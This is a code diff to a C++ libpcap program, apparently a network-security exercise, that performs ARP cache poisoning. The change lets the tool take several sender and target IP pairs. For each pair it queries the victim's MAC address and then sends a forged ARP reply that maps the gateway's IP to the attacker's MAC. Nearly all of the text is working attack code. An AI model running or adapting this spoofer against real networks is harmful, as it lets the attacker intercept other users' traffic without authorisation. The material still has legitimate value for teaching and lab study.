@@ -19,14 +19,13 @@ void usage() {
 }
 
 int main(int argc, char* argv[]) {
-	if (argc != 4) {
+	if (argc < 4) {
 		usage();
 		return -1;
 	}
 
 	const char* dev = argv[1];//store interface
-	printf("argv[2]: %s\n",argv[2]);
-	printf("argv[3]: %s\n",argv[3]);
+	
 	/*
 		get attacker's mac addr and ip addr
 	*/
@@ -52,6 +51,8 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
+	int i=2;
+	while(i<argc){
 	reqPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//broadcast adress to send the packet to all of hosts
 	reqPacket.eth_.smac_ = Mac(mac_buf);
 	reqPacket.eth_.type_ = htons(EthHdr::Arp);
@@ -63,7 +64,7 @@ int main(int argc, char* argv[]) {
 	reqPacket.arp_.smac_ = Mac(mac_buf);
 	reqPacket.arp_.sip_ = htonl(Ip(ip_buf));
 	reqPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	reqPacket.arp_.tip_ = htonl(Ip(argv[2]));//
+	reqPacket.arp_.tip_ = htonl(Ip(argv[i]));//
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqPacket), sizeof(EthArpPacket));
 	if (res != 0) {
@@ -103,67 +104,29 @@ int main(int argc, char* argv[]) {
 	infPacket.arp_.pln_ = Ip::SIZE;
 	infPacket.arp_.op_ = htons(ArpHdr::Reply);
 	infPacket.arp_.smac_ = Mac(mac_buf);//attacker mac addr
-	infPacket.arp_.sip_ = htonl(Ip(argv[3]));//target(getway) ip addr
+	infPacket.arp_.sip_ = htonl(Ip(argv[i+1]));//target(getway) ip addr
 	infPacket.arp_.tmac_ = Mac(sender_mac);//sender mac adr
-	infPacket.arp_.tip_ = htonl(Ip(argv[2]));//sender ip addr
+	infPacket.arp_.tip_ = htonl(Ip(argv[i]));//sender ip addr
 
 	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infPacket), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		return -1;
 	}
+	i+=2;
+	}
 
-	// while (true) {
-	// 	res = pcap_next_ex(handle, &header, &packet);
-	// 	if (res == 0) continue;
-	// 	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-	// 		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-	// 		break;
-	// 	}
-	// 	printf("%u bytes captured\n", header->caplen);
-	// }
 
 	pcap_close(handle);
 
 	return 0;
 	
-	/*
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
-	*/
+	
 
 	
 
 	//ARP request to get sender's MAC address
 
 	
-/*
 
-	EthArpPacket packet;
-	//packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
-	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-	//packet.eth_.smac_ = Mac("00:00:00:00:00:00");
-	packet.eth_.smac_ = Mac("4a:fd:01:6c:f4:15");
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac("4a:fd:01:6c:f4:15");
-	packet.arp_.sip_ = htonl(Ip("10.0.2.15"));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip("10.0.2.2"));
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-
-	pcap_close(handle);
-*/
 }
